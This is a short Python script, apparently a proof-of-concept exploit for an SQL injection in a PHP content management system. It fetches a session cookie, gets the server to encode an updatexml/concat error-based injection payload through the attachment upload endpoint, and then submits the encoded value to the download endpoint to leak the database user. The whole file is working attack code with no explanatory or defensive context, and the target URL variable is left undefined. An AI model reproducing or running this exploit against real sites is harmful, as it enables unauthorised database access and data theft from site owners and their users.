#coding:utf-8
import requests

s = requests.session()
params_get_userid = {
    'm':'wap',
    'c':'index',
    'siteid':'1',
}
rep = s.get(url,params=params_get_userid)
for cookie in rep.cookies:
    if '_siteid' in cookie.name:
        userid = cookie.value #userid为第一次加密的$this->userid
payload = '%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26' 
url_get_encode = '{}?m=attachment&c=attachments&a=swfupload_json&aid=1&src={}'.format(url,payload)
data = {'userid_flash':userid}
rep = s.post(url_get_encode,data=data)
for cookie in rep.cookies:
    if '_att_json' in cookie.name:
        encode_payload = cookie.value
    
params = {
    'm':'content',
    'c':'down',
    'a_k':encode_payload,
}
rep = s.get(url,params=params)
print rep.content